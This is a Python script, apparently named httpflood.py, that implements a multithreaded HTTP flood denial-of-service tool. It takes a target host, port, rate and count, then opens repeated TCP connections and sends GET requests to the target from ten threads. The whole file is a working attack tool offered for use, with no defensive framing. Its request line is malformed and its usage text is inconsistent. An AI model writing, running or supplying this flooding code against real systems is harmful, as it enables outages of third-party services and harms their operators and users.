import random
import socket
import string
import threading
import time
from argparse import ArgumentParser
from math import floor

# Create a shared variable for thread counts
num_tried = 0
num_tried_mutex = threading.Lock()


def print_status():
    global num_tried
    num_tried_mutex.acquire(True)

    num_tried += 1
    # print("\n " + time.ctime().split(" ")[3] + " " + "[" + str(num_tried) + "] #-#-# Hold Your Tears #-#-#")

    num_tried_mutex.release()


def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


def attack(ip, port, count, interval):
    for i in range(count):
        try:
            print_status()
            dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            dos.connect((ip, port))
            msg = "GET /%s HTTP packet/\n\n" % ip
            byt = msg.encode()
            dos.send(byt)
        except socket.error:
            print("\n [ No connection, server may be down ]: " + str(socket.error))
        finally:
            # Close our socket gracefully
            dos.shutdown(socket.SHUT_RDWR)
            dos.close()
        time.sleep(interval)


def HTTP_Flood(dstIP, dstPort, count, pps=None):
    all_threads = []
    n_threads = 10

    if pps:
        interval = round(1/pps * n_threads, 5)
    else:
        interval = 0.1  # approximately 100 requests per second

    count_per_thread = floor(count/n_threads)
    count_remain = count - n_threads * count_per_thread
    # for i in range(count):
    for i in range(n_threads):
        if i == 0:
            t = threading.Thread(target=attack, args=(dstIP, dstPort, count_per_thread+count_remain, interval))
        else:
            t = threading.Thread(target=attack, args=(dstIP, dstPort, count_per_thread, interval))
        t.start()
        all_threads.append(t)

        # Adjusting this sleep time will affect requests per second
        # time.sleep(interval)

    for current_thread in all_threads:
        current_thread.join()  # Make the main thread wait for the children threads

    global num_tried
    print(f'[{num_tried}] requests performed.')


def main():
        parser = ArgumentParser()
        parser.add_argument('--target', '-t', help='target hostname')
        parser.add_argument('--port', '-p', help='target port number')
        parser.add_argument('--pps', '-i', help='packets per second')
        parser.add_argument('--count', '-c', help='number of attacks')
        parser.epilog = "Usage: python httpflood.py -h ABC.com -p 8080 -i 50 -c 100000"

        args = parser.parse_args()

        if args.target is not None:
            if args.port is not None:
                if args.count is not None:
                    HTTP_Flood(args.target, int(args.port), int(args.count), int(args.pps))
        else:
            print('''usage: httpflood.py [-t targetIP] [-p PORT] [-i PPS] [-c COUNT]
optional arguments:
    -t TARGET   target IP address
    -p PORT     target port number
    -i PPS      number of packets per second
    -c COUNT    number of packets
    ''')
            exit()


if __name__ == '__main__':
    main()

